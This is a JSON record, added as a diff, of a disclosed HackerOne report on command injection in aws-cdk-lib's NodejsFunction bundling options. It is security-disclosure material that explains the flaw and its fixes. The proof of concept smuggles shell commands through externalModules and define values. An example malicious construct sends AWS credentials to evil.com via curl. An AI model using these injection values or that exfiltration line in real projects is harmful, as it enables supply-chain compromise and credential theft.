@@ -1,0 +1,122 @@
+{
+  "id": 3558713,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTU4NzEz",
+  "url": "https://hackerone.com/reports/3558713",
+  "title": "Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-02-17T10:22:34.543Z",
+  "submitted_at": "2026-02-17T10:22:34.970Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "inkerton",
+    "url": "/inkerton",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 84809,
+    "url": "https://hackerone.com/aws_vdp",
+    "handle": "aws_vdp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fgfqam8gl7lzo8u8v0kiphkxfyt8/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fgfqam8gl7lzo8u8v0kiphkxfyt8/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "AWS VDP",
+      "twitter_handle": "amazon",
+      "website": "https://aws.amazon.com/",
+      "about": "Amazon Web Services (AWS) is a secure cloud services platform, offering compute power and other functionality to help businesses scale and grow. "
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-11T16:54:20.737Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-11T16:48:10.405Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Asset**: `aws-cdk-lib` (npm package), source: https://github.com/aws/aws-cdk\n**Severity**: High\n**CWE**: CWE-78 (Improper Neutralization of Special Elements used in an OS Command, 'OS Command Injection')\n\n---\n\n## Summary\n\nThe `NodejsFunction` construct in `aws-cdk-lib/aws-lambda-nodejs` constructs a shell command string from several user-controlled bundling properties (`externalModules`, `define`, `loader`, `inject`, `esbuildArgs`) without sanitizing or escaping shell metacharacters. This command string is then executed via `spawnSync('cmd', ['/c', command])` on Windows or `spawnSync('bash', ['-c', command])` on Linux/macOS.\n\nAn attacker who controls these properties (for example, through a malicious CDK construct published as an npm package or a malicious pull request to a CDK project) can inject arbitrary OS commands that execute on any machine running `cdk synth`, `cdk deploy`, or `cdk diff`.\n\n---\n\n## Vulnerable Code\n\n**File**: [`packages/aws-cdk-lib/aws-lambda-nodejs/lib/bundling.ts`](https://github.com/aws/aws-cdk/blob/main/packages/aws-cdk-lib/aws-lambda-nodejs/lib/bundling.ts)\n\n### .1 Unsanitized interpolation into the esbuild command array (lines 245–266)\n\n```typescript\n// bundling.ts, lines 245-266\nconst esbuildCommand: string[] = [\n  options.esbuildRunner,\n  '--bundle', `\"${relativeEntryPath}\"`,\n  `--target=${this.props.target ?? toTarget(scope, this.props.runtime)}`,\n  '--platform=node',\n  // ...\n  ...this.externals.map(external => `--external:${external}`),         // LINE 255 — NO ESCAPING\n  ...loaders.map(([ext, name]) => `--loader:${ext}=${name}`),          // LINE 256 — NO ESCAPING\n  ...defines.map(([key, value]) => `--define:${key}=${JSON.stringify(value)}`), // LINE 257 — key NOT ESCAPED\n  // ...\n  ...this.props.inject ? this.props.inject.map(i => `--inject:\"${i}\"`) : [],   // LINE 265 — NO ESCAPING\n  ...this.props.esbuildArgs ? [toCliArgs(this.props.esbuildArgs)] : [],         // LINE 266 — NO ESCAPING\n];\n```\n\nThe values of `external`, `ext` (loader keys), `key` (define keys), `i` (inject paths), and `esbuildArgs` keys/values are all interpolated directly into the command string without any sanitization or quoting.\n\n### .2 Command string assembly (line 302)\n\n```typescript\n// bundling.ts, line 302\nesbuildCommand.join(' ')\n```\n\nAll array elements are joined with a single space. Shell metacharacters like `&`, `|`, `;`, `` ` ``, `$(...)` within any element will be interpreted by the shell.\n\n### .3 Shell execution (lines 334–349)\n\n```typescript\n// bundling.ts, lines 334-349\nexec(\n  osPlatform === 'win32' ? 'cmd' : 'bash',\n  [\n    osPlatform === 'win32' ? '/c' : '-c',\n    localCommand,   // <-- the unsanitized command string\n  ],\n  {\n    env: { ...process.env, ...environment },\n    stdio: ['ignore', process.stderr, 'inherit'],\n    cwd,\n    windowsVerbatimArguments: osPlatform === 'win32',\n  });\n```\n\nWhere `exec` is a thin wrapper around `spawnSync` in `lib/util.ts` (line 74):\n\n```typescript\n// util.ts, line 74\nexport function exec(cmd: string, args: string[], options?: SpawnSyncOptions) {\n  const proc = spawnSync(cmd, args, options);\n  // ...\n}\n```\n\nThe `localCommand` string is passed as the second argument to `cmd /c` (Windows) or `bash -c` (Linux), meaning the entire string is interpreted by the operating system's shell.\n\n---\n\n## Proof of Concept\n\n### Prerequisites\n- Node.js v18+ installed\n- npm installed\n\n### Step 1: Create the project\n\n```bash\nmkdir repro-cdk-bundling-rce\ncd repro-cdk-bundling-rce\nnpm init -y\n```\n\n### Step 2: Install dependencies\n\n```bash\nnpm install aws-cdk-lib constructs esbuild typescript\nnpm install --save-dev aws-cdk ts-node\n```\n\n### Step 3: Create `tsconfig.json`\n\n```json\n{\n  \"compilerOptions\": {\n    \"target\": \"es2020\",\n    \"module\": \"commonjs\",\n    \"strict\": true,\n    \"skipLibCheck\": true\n  }\n}\n```\n\n### Step 4: Create `lambda/lambda-handler.ts`\n\n```bash\nmkdir lambda\n```\n\n```typescript\n// lambda/lambda-handler.ts\nexport const handler = async (event: any) => {\n    return { statusCode: 200, body: 'Hello' };\n};\n```\n\n### Step 5: Create `app.ts` with the injection payload\n\n```typescript\nimport * as cdk from 'aws-cdk-lib';\nimport { Stack, StackProps } from 'aws-cdk-lib';\nimport { NodejsFunction } from 'aws-cdk-lib/aws-lambda-nodejs';\nimport { Runtime } from 'aws-cdk-lib/aws-lambda';\nimport { Construct } from 'constructs';\nimport * as path from 'path';\n\nexport class ReproStack extends Stack {\n    constructor(scope: Construct, id: string, props?: StackProps) {\n        super(scope, id, props);\n\n        new NodejsFunction(this, 'MyHandler', {\n            entry: path.join(__dirname, 'lambda', 'lambda-handler.ts'),\n            runtime: Runtime.NODEJS_20_X,\n            bundling: {\n                // INJECTION: The '&' character breaks out of the esbuild argument\n                // and executes a second command on the host OS.\n                externalModules: ['foo & echo PWNED_VIA_EXTERNAL > pwned_ext.txt'],\n                define: {\n                    'FOO & echo PWNED_VIA_DEFINE > pwned_def.txt': 'bar'\n                }\n            }\n        });\n    }\n}\n\nconst app = new cdk.App();\nnew ReproStack(app, 'ReproStack');\napp.synth();\n```\n\n### Step 6: Run the synthesis\n\n```bash\nnpx ts-node app.ts\n```\n\nThis triggers local bundling. The CDK constructs the following shell command (captured from runtime):\n\n```\nnpx.cmd --no-install esbuild --bundle \"...\\lambda-handler.ts\" --target=node20 --platform=node --outfile=\"...\\index.js\" --external:foo & echo PWNED_VIA_EXTERNAL > pwned_ext.txt --define:FOO & echo PWNED_VIA_DEFINE > pwned_def.txt=\"bar\"\n```\n\nThe `&` character splits the single command into three separate shell commands:\n1. `npx.cmd --no-install esbuild --bundle ... --external:foo`, esbuild runs normally\n2. `echo PWNED_VIA_EXTERNAL > pwned_ext.txt`, **attacker's injected command executes**\n3. `echo PWNED_VIA_DEFINE > pwned_def.txt=\"bar\"`, **attacker's second injected command executes**\n\n### Step 7: Verify RCE\n\n```bash\n# On Windows:\ntype pwned_ext.txt\ntype pwned_def.txt\n\n# On Linux/macOS:\ncat pwned_ext.txt\ncat pwned_def.txt\n```\n\nBoth files are created in the project directory, confirming that the injected shell commands executed successfully.\n\n---\n\n## Relationship to Related Vulnerability\n\nThis vulnerability is related to, but distinct from, a separate command injection issue I reported in the same module via `tsconfig.json` compiler options (Report: #3534806 ). Both exploit the same underlying design flaw, unsanitized string concatenation into a shell command, but they differ in entry point, trigger conditions, and attack surface.\n\n| Aspect | Vuln 1: `tsconfig.json` Injection | Vuln 2: Bundling Options Injection (this report) |\n|---|---|---|\n| **Input source** | `tsconfig.json` file read from disk | CDK construct properties defined in code (`externalModules`, `define`, `loader`, etc.) |\n| **Vulnerable function** | `getTsconfigCompilerOptions()` in `lib/util.ts` | `createBundlingCommand()` in `lib/bundling.ts` |\n| **Trigger condition** | Requires `preCompilation: true` to be explicitly set | **Always active** — the default local bundling code path processes these properties unconditionally |\n| **What gets injected** | Compiler option values from `compilerOptions` in `tsconfig.json` | Values from `externalModules[]`, `define{}` keys, `loader{}` keys, `inject[]`, `esbuildArgs{}` keys/values |\n| **Attack vector** | Attacker places a malicious `tsconfig.json` file in the project (e.g., via a PR) | Attacker provides malicious values through a published CDK construct (npm package), a shared internal library, or a PR modifying CDK app code |\n| **Number of injectable parameters** | One (`compilerOptions` values) | Multiple (at least 5 distinct properties) |\n| **Execution sink** | Same: `exec()` → `spawnSync('cmd'/'bash', ['/c'/'-c', command])` | Same |\n\nBoth vulnerabilities converge at the same execution sink: the `exec()` function in `util.ts` (line 74), which passes the assembled command string directly to a shell interpreter via `spawnSync`. This means the root cause is systemic, the entire command construction pipeline in `aws-lambda-nodejs` lacks input sanitization before shell execution. A comprehensive fix should address this at the architectural level by eliminating shell-based command execution in favor of array-based `spawnSync` (without shell interpretation).\n\n---\n\n## Remediation\n\n1. **Use array-based `spawnSync`**: Replace the pattern of building a single shell command string and executing it via `cmd /c` or `bash -c`. Instead, pass arguments directly as an array to `spawnSync('esbuild', [...args])` without shell interpretation.\n\n2. **If shell execution is required**: Escape all user-provided values for the target shell before interpolation. On Windows, this means handling `&`, `|`, `>`, `<`, `^`, etc. On Linux, this means handling `;`, `&`, `|`, `$`, `` ` ``, etc.\n\n3. **Input validation**: Validate that values like `externalModules` entries conform to expected npm package name patterns (e.g., `/^[@a-z0-9][a-z0-9._\\/-]*$/`). Reject values containing shell metacharacters.\n\n## Impact\n\n### Attack Scenarios\n\n**1. Malicious Published CDK Construct (Supply Chain Attack)**\n\nAn attacker publishes an npm package that exports a \"convenience\" CDK construct wrapping `NodejsFunction`. The construct passes attacker-controlled values into `externalModules`, `define`, or other unsanitized bundling properties. Any developer or CI/CD system that imports this construct and runs `cdk synth` will execute the attacker's commands.\n\nExample of a malicious construct:\n\n```typescript\n// Published as \"convenient-lambda\" on npm\nimport { NodejsFunction } from 'aws-cdk-lib/aws-lambda-nodejs';\n\nexport class ConvenientLambda extends NodejsFunction {\n  constructor(scope, id, props) {\n    super(scope, id, {\n      ...props,\n      bundling: {\n        ...props.bundling,\n        externalModules: [\n          ...(props.bundling?.externalModules ?? []),\n          // Attacker payload hidden among legitimate-looking externals\n          'lodash & curl https://evil.com/exfil?data=$(cat ~/.aws/credentials | base64)',\n        ],\n      },\n    });\n  }\n}\n```\n\n**2. Malicious Pull Request**\n\nAn attacker submits a PR to an open-source or internal CDK project. The PR modifies the `bundling` configuration of a `NodejsFunction` to include a payload. When a reviewer or CI/CD pipeline runs `cdk synth`, the payload executes.\n\n### Consequences\n\n- **Credential Theft**: Steal `~/.aws/credentials`, environment variables, CI/CD secrets\n- **Reverse Shell**: Establish persistent access to the build machine\n- **Supply Chain Pivot**: Modify build artifacts, inject backdoors into deployed Lambda code\n- **Data Exfiltration**: Read source code, database credentials, private keys\n\n---\n\n## Scope of Vulnerability (Affected Properties)\n\nThe following `bundling` properties in `NodejsFunction` are vulnerable:\n\n| Property | Source Line | Interpolation Pattern | Sanitization |\n|---|---|---|---|\n| `externalModules` | L255 | `` `--external:${external}` `` | **None** |\n| `loader` (keys) | L256 | `` `--loader:${ext}=${name}` `` | **None** |\n| `define` (keys) | L257 | `` `--define:${key}=...` `` | Key: **None**, Value: `JSON.stringify` |\n| `inject` | L265 | `` `--inject:\"${i}\"` `` | **None** |\n| `esbuildArgs` (keys/values) | L266 / L451-465 | Various patterns | **None** |\n| `banner` | L262 | `` `--banner:js=${JSON.stringify(...)}` `` | `JSON.stringify` (partial) |\n| `footer` | L263 | `` `--footer:js=${JSON.stringify(...)}` `` | `JSON.stringify` (partial) |\n\nThe most exploitable vectors are `externalModules` and `define` keys since they have zero sanitization and accept arbitrary strings with no validation.\n\n---",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "high",
+    "score": 7.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 680609,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/aws/aws-cdk",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
